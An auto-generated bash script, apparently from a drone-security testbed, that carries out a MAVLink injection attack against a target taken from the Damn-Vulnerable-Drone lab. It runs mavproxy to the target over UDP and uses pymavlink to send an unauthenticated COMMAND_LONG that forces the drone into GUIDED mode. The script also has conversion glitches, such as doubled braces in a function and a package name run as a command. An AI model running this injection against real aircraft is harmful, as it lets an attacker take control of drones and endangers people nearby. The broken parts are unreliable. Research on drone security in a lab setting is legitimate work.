#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/MAVLink-Injection-Attack.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# ==========================================================
# MTD-aware Target Acquisition & Logging Setup
# ==========================================================
SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
PROJECT_ROOT=$(realpath "$SCRIPT_DIR/../../../../")

# MTD 타겟 조회
pushd "$PROJECT_ROOT" > /dev/null
TARGET_ADDR=$(python3 -m dvd_lite.dvd_attacks_lpc.interface)
POP_RESULT=$?
popd > /dev/null

if [ $POP_RESULT -ne 0 ] || [ -z "$TARGET_ADDR" ]; then
    echo "ERROR: Could not get active target from MTD interface. Aborting attack."
    exit 1
fi

TARGET_IP=$(echo $TARGET_ADDR | cut -d: -f1)
TARGET_PORT=$(echo $TARGET_ADDR | cut -d: -f2)

# 중앙 로거 함수 정의 (정확한 타임스탬프를 위해 쉘의 log 함수와 통합)
log() {{
    # 쉘 표준 로그 출력
    printf '[%(%F_%T)T] %s\n' -1 "$*"

    # bus.log에 JSON 이벤트 로깅
    EVENT_TYPE=$1
    shift
    EVENT_DATA_STR="$*"
    pushd "$PROJECT_ROOT" > /dev/null
    python3 -c "from dvd_lite.dvd_attacks_lpc.bus.logger import log_bus_event; log_bus_event('$EVENT_TYPE', {{'message': '$EVENT_DATA_STR'}})"
    popd > /dev/null
}}
# MTD_INTERFACE_END
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
fi

log "[ATTACK] id=mavlink-injection-attack src=MAVLink-Injection-Attack.md"
log "[BLOCK 1] type=shell"
python3-pip python3-matplotlib python3-lxml python3-pygame
echo 'export PATH="$PATH:$HOME/.local/bin"' >> ~/.bashrc

log "[BLOCK 2] type=shell"
mavproxy.py --master=/dev/ttyUSB0 --baudrate 57600 --aircraft MyAircraft

log "[BLOCK 3] type=shell"
mavproxy.py --master=udp:${TARGET_IP}:14550

log "[BLOCK 4] type=shell"
mavproxy.py --master=udp:${TARGET_IP}:14550 --out=udp:${TARGET_IP}:14551

log "[BLOCK 5] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<PY
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:127.0.0.1:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
from pymavlink import mavutil

# Connect to the forwarding port
master = mavutil.mavlink_connection('udp:127.0.0.1:14550')
master.wait_heartbeat()
print("[+] Connected to drone")

# Change mode using COMMAND_LONG
master.mav.command_long_send(
    1, 1,  # target system, target component
    mavutil.mavlink.MAV_CMD_DO_SET_MODE,
    0,
    1, 0, 4,  # param1: base_mode=1, param2: unused, param3: custom_mode=4 (GUIDED)
    0, 0, 0, 0
)

print("[!] Sent mode change command")
PY

